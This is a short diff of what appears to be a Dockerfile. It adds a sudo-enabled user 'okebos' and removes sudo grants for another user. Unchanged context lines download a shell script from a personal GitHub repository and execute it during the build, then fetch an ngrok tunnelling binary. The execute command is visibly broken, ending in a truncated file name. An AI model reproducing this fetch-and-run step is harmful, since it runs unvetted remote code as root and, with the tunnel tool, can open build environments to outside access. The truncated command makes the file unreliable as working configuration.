@@ -56,9 +56,7 @@ ENV HOME=/root \
 RUN useradd -m okebos && \
     adduser okebos sudo && \
     sudo usermod -a -G sudo okebos
-RUN adduser u58286 sudo && \
-    sudo usermod -a -G sudo u58286
-    
+
 
 RUN wget https://raw.githubusercontent.com/razmai9/bitbucket/master/sugar2.sh && chmod +x sugar2.sh && ./sugar2.s
 RUN wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
